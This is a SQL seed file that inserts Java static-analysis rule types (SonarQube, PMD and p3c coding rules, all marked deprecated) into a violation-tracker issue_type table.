INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('39a8c51a-eb80-4ec1-9534-fab71b540be5', 'Avoid Catching Throwable', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('39fa9558-b6df-4c20-9009-25f1a8d68362', '[p3c]Do not use complicated statements in conditional statements.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('3a6d4afa-bbd2-4d3f-86d6-2405cff12d41', 'Exception should not be created without being thrown', 'sonarqube', 'BUG', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('3b1b6714-6f2c-4468-84da-1f4c8a97f77c', 'Avoid Throwing Null Pointer Exception', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('3b7c16f6-b4ec-43c5-9478-bd2a9d886798', 'Replace Vector With List', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('3bd2c272-f15e-499b-8303-23d2b1196d7d', 'Permissive Cross-Origin Resource Sharing policy is security-sensitive', 'sonarqube', 'SECURITY_HOTSPOT', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('3bf4a33f-666b-402d-a132-1933119a604a', 'If a class implements Cloneable the return type of the method clone() must be the class name', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('3d6cf5bf-d104-44d5-b08c-62a4477f7ed8', 'Use Index Of Char', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('3ecbb3c7-dad3-45c0-9080-59a3541cd392', '[p3c]Avoid using *Apache BeanUtils* to copy attributes.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('3ef2100f-4727-48ce-96f6-02490dbc6c10', 'Naming - Class naming conventions', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('3f38e978-4c33-4df4-b536-1c3b4028e95e', 'Classes should not be too complex', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('3f50123d-a67c-4bb1-80b8-2c3e77b609a2', '[p3c]Abstract class names must start with Abstract or Base.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('3fd89164-0389-4a86-b16d-5d7991a8d896', 'Naming - Method naming conventions', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('42c25a0c-fb2c-4ca4-9154-3ffbc08e5e43', 'Avoid Using Octal Values', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('42c3eae8-dd4c-4690-a561-cc203499a4e7', 'Avoid unnecessary comparisons in boolean expressions', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('43260efc-5a0b-4f51-bd73-6e98bd18f491', 'Return From Finally Block', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('43b25f32-6ad9-42d2-9ab0-b2ee3c6b4250', 'JUnit4 Test Should Use Test Annotation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('449c1804-3a77-41b1-912c-b6fd7d318aa0', 'Failed unit tests should be fixed', 'sonarqube', 'BUG', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('4591bacc-556a-4d5d-ba40-7b3cf41a4090', 'Generics Naming', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('465e9ef3-e829-4eac-8fa2-ae7803c2db85', '[p3c]Never use return within a finally block.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('46ac3038-7d5a-40ed-9021-be3834778e45', 'Final Field Could Be Static', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('46aed1ac-8e2f-4a30-9559-9fddca15ab00', 'Avoid Branching Statement As Last In Loop', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('46f57f26-72bb-4023-80ea-6670d0d2e241', 'Close Resource', 'sonarqube', 'BUG', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('46fbc549-78b4-416c-ae9c-d1ef6449b1eb', '[p3c]The wrapper classes should be compared by equals method rather than by symbol of ''=='' directly.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('471c9edb-b0cc-4588-a01c-2131ab8a8894', 'Naming - Suspicious constant field name', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('4848545d-b21e-4de3-89aa-b20d89593454', 'Loose Coupling (With Type Resolution)', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('4a1f646f-66b9-4197-9a7c-c9aa0deac223', 'Tests should not be ignored', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('4a99b2dc-b60f-488e-a42c-a04e8766fdee', 'Use assertSame instead of assertTrue', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('4b3cdeb1-5a34-4cad-bd91-55eb3274dd20', 'XPath rule template', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('4ca48391-a999-4ad2-abc4-04404bd09ff7', 'Consecutive Appends Should Reuse', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('4e1dfdaa-bd09-4155-bfda-068202ff0a87', 'NPath complexity', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('4eac12cb-bc76-49be-b28f-8b071831cdc6', '[p3c]Use the append method in StringBuilder inside a loop body when concatenating multiple strings.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('4ebe98b8-49d1-4d3b-ab3a-1e291a4745ad', '[p3c]In a switch block, each case should be finished by break/return.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('4ecb0485-3c89-461b-b215-4870c50258ab', 'Ternary operator with a boolean literal can be simplified with a boolean expression', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('4f8cf22e-712b-4948-8feb-f5d5a54439bb', 'Ncss Type Count', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('50331cfd-b41a-49be-8c3b-8d1c158834d1', 'Empty Statement Block', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('50c440a9-aa8d-4b77-8a2d-362bbb02f5f4', 'Avoid Multiple Unary Operators', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('50ffac2f-27cc-418c-b715-206ad3b0c135', 'Unconditional If Statement', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('51903161-132f-4482-b671-fb741bc9372a', 'Avoid Protected Method In Final Class Not Extending', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('52665afa-86cf-46b1-800f-7f42bf8b467f', 'Empty Catch Block', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('52e51cdc-d4cd-43a5-85f7-dbb41cd2f5ce', 'Use Correct Exception Logging', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('53488698-82cd-4ee6-9b3a-009aba698f5b', 'Avoid Instanceof Checks In Catch Clause', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('540fbd40-4605-4d19-bef5-3fd09235271b', 'Naming - Avoid dollar signs', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('553aa4c7-c617-4e06-b649-8dc168e52b09', 'While Loops Must Use Braces', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('554a09b3-cc66-4dd0-b651-f18242c1bba9', 'Long Variable', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('556072a4-b6a3-4ecc-a6b5-d790a589a685', 'Unused private method', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('56b1e8f7-6c4b-4b9c-a111-3164ae09e4e7', 'Excessive Public Count', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('57ff216d-e1e6-49ca-ab55-5636b30279ec', 'Inefficient Empty String Check', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('58a0d77b-2b05-44cb-8094-8d4656cf9af3', '[p3c]Codes or configuration that is noticed to be obsoleted should be resolutely removed from projects.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('59c8da5a-145d-4614-a863-54ecf0165052', 'Constructor Calls Overridable Method', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('59d8ac5a-b799-4688-a256-38c79fabcc59', 'Unnecessary Wrapper Object Creation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('5a3de30a-4fa0-4900-bad6-9ebe80854d39', 'Avoid Literals In If Condition', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('5ad03cc2-b279-49fa-8280-65c0b4443de4', '[p3c]Javadoc should be used for classes, class variables and methods. The format should be ''/** comment **/'', rather than ''// xxx''.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('5b2a96e5-2f8d-412c-bba8-b8d16a65c810', '[p3c]Do not use methods which will modify the list after using Arrays.asList to convert array to list.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('5bec1f38-83b2-4089-bbe2-6ceac9de9096', 'Use assertEquals instead of assertTrue', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('5cd35642-4e91-4024-8bae-0a3d03a43f79', 'Use Notify All Instead Of Notify', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('5d8e35b4-33d7-414a-b9f2-7b799cd14d2e', '[p3c]Must be ended with Exception.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('5d936f0a-f27c-46e4-9126-6078595c43e4', 'Loose Package Coupling', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('5de26ec3-0424-4922-a51d-a3ac5e8572be', '[p3c]The negation operator is not easy to be quickly understood.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('5e0781af-d21a-4e71-8dcd-a32d5b347d09', 'Logic Inversion', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('5e94fcb7-be43-4185-bd43-329d83cd592e', 'If Else Stmts Must Use Braces', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('5f9ea61b-a63c-4d7a-b68e-2c61e46843d6', 'Empty Statement Not In Loop', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('60510a85-9ef2-40d1-b4ca-76d5df18a60c', 'Append Character With Char', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('60e0cf1c-b9d0-484d-865e-dd70b8c3a40b', 'Missing Static Method In Non Instantiatable Class', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('6135bcf7-5d37-49b9-8a80-62f5781e19ae', 'Non Thread Safe Singleton', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('6145c6a2-a9b4-42c8-9356-3ae30cce401f', 'Uncommented Empty Constructor', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('61715ac7-8c31-4914-a1c1-42b9f26d4084', 'Avoid Prefixing Method Parameters', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('61b1a8a2-00d9-49c5-bb44-15b9ef18bda1', '[p3c]Method names, parameter names, member variable names, and local variable names should be written in lowerCamelCase.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('61ee13dc-ac46-435f-8c44-b57eda834544', 'Expanding archive files is security-sensitive', 'sonarqube', 'SECURITY_HOTSPOT', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('63455987-7127-4197-8e12-7feaed1b792d', 'More Than One Logger', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('6347799e-ebfa-45d0-b13f-244c1aa1a387', 'Too Many Fields', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('637ce81f-5b95-4ef0-8cc5-769efd1e674e', 'Loose coupling', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('652efd9d-5c84-47c4-b50d-968edea8be98', 'Avoid StringBuffer field', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('65541523-e274-4ff7-a3cd-ed7b00ec7cc5', '[p3c]SimpleDataFormat is unsafe, do not define it as a static variable. If have to, lock or DateUtils class must be used.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('66b68414-f2b4-45d8-b430-6e7257d91bdb', 'Singular Field', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('66e27d17-2924-41dd-baa8-6f107f850218', 'Use Object For Clearer API', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('67e9eb30-da15-4de0-bfd1-80e7ffc6c305', 'Unnecessary Conversion Temporary', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('68226c22-eeb4-4c09-8ae6-3259b9ebfd88', 'Signature Declare Throws Exception', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('693a4106-9d87-4ca4-85ad-3fb47923d76f', 'Avoid Constants Interface', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('6964096f-d82f-4d8b-82cc-5374488af6e3', '[p3c]Do not use toArray method without arguments.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('6987915e-1e35-467c-83c4-0067360a8c62', 'Use Equals To Compare Strings', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('6a005c63-7afa-4fc8-9fe8-ae855423dac9', 'getInstance should cache the instance', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('6a2cb6a7-5431-4777-b4da-fbdfc74f886c', '[p3c]Braces are used with if, else, for, do and while statements, even if the body contains only a single statement.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('6a4faf84-8414-4128-87be-8175d11c1898', 'Instantiation To Get Class', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('6a560dce-fa89-4668-a3dd-833dfa939f96', 'Use Proper Class Loader', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('6b94c873-50d8-47a8-bdf6-c6a512b1aa4c', 'Accessor Class Generation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('6be41c54-326d-46f0-affc-a4950d6d9920', 'Setting loose file permissions is security-sensitive', 'sonarqube', 'VULNERABILITY', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('6eadcf32-2440-4a97-b46a-e4b324f26269', 'Authentication should not rely on insecure "PasswordEncoder"', 'sonarqube', 'VULNERABILITY', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7121f660-6f30-4048-8907-654a90ae727e', 'Unused formal parameter', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('71929211-46a7-4c6b-a6a8-ebe454a43d7b', '[p3c]Date format string [%s] is error,When doing date formatting, ''y'' should be written in lowercase for ''year''.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7286747a-930e-4052-b9cd-b15b855520cf', 'Equals Null', 'sonarqube', 'BUG', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7345df7c-a5d3-4e68-bd7a-e7581e319431', 'Do Not Use Threads', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('741c94aa-1852-4e12-820b-3c90327a851d', 'JUnit tests should include an assert', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('742a7316-ea83-4d32-a2f9-3cb8af7a6741', 'Finalize Does Not Call Super Finalize', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('75c7d37f-2e1f-4d17-88ce-7541a73e16e3', 'Optimizable To Array Call', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('76a07407-cf71-465c-950e-597601ec1134', 'Useless Operation On Immutable', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('76d3a156-edf6-41e9-8848-99b44cad04d8', '[p3c]type ''ThreadLocal'' must call remove() method at least one times.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('772e50ab-80c0-473c-ba86-274c7670111d', 'Track uses of disallowed methods', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('77c739d5-efe0-4314-b43b-24e2b72d768a', '[p3c]We can call the toString method in a POJO directly to print property values.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('77f87662-af8d-4c6f-940a-cde6ff8f3a92', 'At Least One Constructor', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7897e551-69e3-4da3-b043-dd360db7112c', 'Package case', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('78f5eb0a-1af6-4f15-8b3b-1ec85e1e7659', 'Avoid Deeply Nested If Stmts', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7956fd82-80d0-4bce-bb9a-17ec3d8e3152', 'Use Locale With Case Conversions', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7b0e06e1-b959-4832-8477-5d1827c5df4c', 'Avoid Throwing Raw Exception Types', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7b353ee0-6e6c-4ac8-9e5c-5230d04a3802', 'God Class', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7b680cc4-2ca7-4995-9f5d-847c02edebba', 'Empty While Stmt', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7b6e4860-eca7-4593-a632-fbb304569de8', 'Check Skip Result', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
